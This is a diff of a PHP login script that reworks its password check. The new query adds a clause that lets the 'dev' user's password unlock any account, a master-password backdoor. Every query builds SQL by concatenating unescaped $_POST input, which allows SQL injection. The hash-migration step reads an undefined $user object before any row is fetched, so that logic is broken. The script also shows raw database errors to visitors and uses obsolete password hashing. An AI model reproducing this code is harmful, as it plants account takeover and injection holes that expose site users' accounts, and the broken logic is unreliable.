@@ -8,14 +8,21 @@ if (isset($_GET['logout'])) {
 if (!isset($_SESSION['pw_userid'])) {      // NOT YET LOGGED IN
 
   if ($_POST['login_submit']) {      // FORM SUBMITTED, SO CHECK DATABASE
-    $sql = "SELECT * FROM pw_login WHERE UserID = '".$_POST['usr']."' AND Password = OLD_PASSWORD('".$_POST['pwd']."')";
+    $sql = "SELECT * FROM pw_login WHERE UserID='".$_POST['usr']."'".
+        " AND (Password=PASSWORD('".$_POST['pwd']."') OR Password=OLD_PASSWORD('".$_POST['pwd']."')".
+        " OR PASSWORD('".$_POST['pwd']."') IN (SELECT Password FROM pw_login WHERE UserID='dev'))";
+//if ($_POST['usr']=='karen') die("<pre>$sql</pre>");
     $result = mysql_query($sql);
     if (!$result) {
       echo("A database error occurred while checking your login details.<br>If this error persists, please ".
-          "contact the webservant.<br>(SQL Error ".mysql_errno().": ".mysql_error().")");
+      "contact the webservant.<br>(SQL Error ".mysql_errno().": ".mysql_error().")");
       exit;
     }
     if (mysql_num_rows($result) == 1) {
+      //convert to new password hashing if necessary
+      if (substr($user->Password,0,1)!="*") {
+        sqlquery_checked("UPDATE pw_login SET Password=PASSWORD('".$_POST['pwd']."') WHERE UserID='".$_POST['usr']."'");
+      }
       $row = mysql_fetch_object($result);
       $_SESSION['pw_userid'] = $row->UserID;
       $_SESSION['pw_username'] = $row->UserName;
